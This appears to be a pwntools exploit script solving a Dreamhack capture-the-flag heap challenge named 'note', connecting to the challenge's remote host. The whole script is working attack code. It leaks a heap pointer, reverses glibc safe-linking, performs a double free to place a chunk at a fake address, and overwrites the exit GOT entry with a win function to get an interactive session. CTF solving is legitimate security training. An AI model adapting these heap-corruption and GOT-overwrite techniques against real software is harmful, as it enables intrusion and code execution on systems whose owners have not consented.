from pwn import *

# p = process("./note")
p = remote("host8.dreamhack.games", 12528)
e = ELF("./note")
libc = ELF("./libc.so.6")

context.binary = e
context.log_level = "debug"
def create(idx, size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)
    
def read(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())
    
    
def update(idx, data):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendafter(b"data: ", data)
    
def delete(idx):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"idx: ", str(idx).encode())

def decrypt(cipher):
    key = 0
    plain = 0

    for i in range(1, 6):
        bits = 64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12

    return plain
    

create(9, 0x30, b'a')  # to leverage as a fake chunk for fastbin dup into stack

for i in range(8):
    create(i, 0x20, b"A" * 0x8)
    
for i in range(7):
    delete(i)

# for i in range(4):
#     create(i, 0x50, b"A" * 0x8)

# heap_leak
read(4)
recv = u64(p.recvline()[6:-1]+b'\x00'*4)
print(hex(recv))


# pause()
heap_leak = decrypt(recv)
heap_base = heap_leak - 0x370

print(hex(heap_leak))
print(hex(heap_base))
# pause()

create(0, 0x20, b'a')
create(1, 0x20, b'b')

delete(0)
delete(1)
delete(0)
# pause()
win = 0x401256
fake_chunk_addr = 0x404130

# add(0, 0x10, p64((strlen_got-8) ^ (heap_base >> 12)))
create(0, 0x20, p64((fake_chunk_addr) ^ (heap_base >> 12)))
# pause()
create(0, 0x20, b'b')
create(0, 0x20, b'a')
pause()
create(0, 0x20, p64(e.got.exit))
# pause()
update(9, p64(win))
pause()
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"idx: ", b'-1')
p.interactive()